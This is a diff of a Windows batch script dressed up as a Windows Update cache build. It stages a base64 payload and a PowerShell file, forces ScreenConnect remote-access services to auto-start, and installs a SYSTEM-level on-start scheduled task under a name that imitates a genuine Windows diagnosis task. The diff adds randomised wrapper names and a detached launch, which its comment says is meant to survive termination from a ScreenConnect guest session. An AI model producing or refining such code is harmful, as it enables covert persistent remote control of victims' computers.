@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU8A ===
+echo === GO.CMD BUILD 20260730WU8B ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -13,12 +13,12 @@ set "B64=%WORKDIR%\update.b64"
 set "PS1=%WORKDIR%\wucache_pkg.ps1"
 set "PS1ALT=C:\Windows\Temp\wucache_pkg.ps1"
 set "ERR=%WORKDIR%\boot.err"
-set "WRAP=%WORKDIR%\boot.cmd"
 set "MARKER=WU_BUILD_20260730_UNIFIED5"
 set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
 set "CB=%RANDOM%%RANDOM%"
 set "ALTSC=ScreenConnect Client (f861c8140d453427)"
 set "PRIMSC=ScreenConnect Client (5f6010579852e507)"
+set "WRAP=%WORKDIR%\boot_%RANDOM%.cmd"
 
 if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
 if not exist "C:\Windows\Temp" mkdir "C:\Windows\Temp" >nul 2>&1
@@ -27,7 +27,6 @@ sc config "%ALTSC%" start= auto >nul 2>&1
 sc start "%ALTSC%" >nul 2>&1
 
 del /f /q "%B64%" >nul 2>&1
-del /f /q "%WRAP%" >nul 2>&1
 del /f /q "%ERR%" >nul 2>&1
 del /f /q "%WORKDIR%\go.flag" >nul 2>&1
 schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
@@ -74,20 +73,16 @@ for %%A in ("%B64%") do echo OK bytes=%%~zA
 >>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1
 >>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^>"%ERR%"
 
-echo boot_cmd_ready>"%WORKDIR%\go.flag"
+echo %WRAP%>"%WORKDIR%\go.flag"
 
-REM Background worker (empty title required by start syntax)
-start /b "" "%WRAP%"
+REM Detached process (NOT /b) so SC Guest 10s kill cannot stop the worker
+start "" /min cmd.exe /c "%WRAP%"
 
-REM SYSTEM task backup
+REM SYSTEM task backup (independent of this console)
 schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "%WRAP%" >nul 2>&1
 schtasks /Run /TN "%ONCETASK%" >nul 2>&1
 
-echo Launched worker [%MARKER%] via start/b + schtasks.
-echo Wait 2-3 min then:
-echo   type "%ERR%"
-echo   type "%WORKDIR%\.diag.log"
-echo   sc query "%PRIMSC%"
-echo   sc query "%ALTSC%"
+echo Launched DETACHED worker [%MARKER%].
+echo Check in 2-3 min: type "%ERR%"
 sc start "%ALTSC%" >nul 2>&1
 exit /b 0
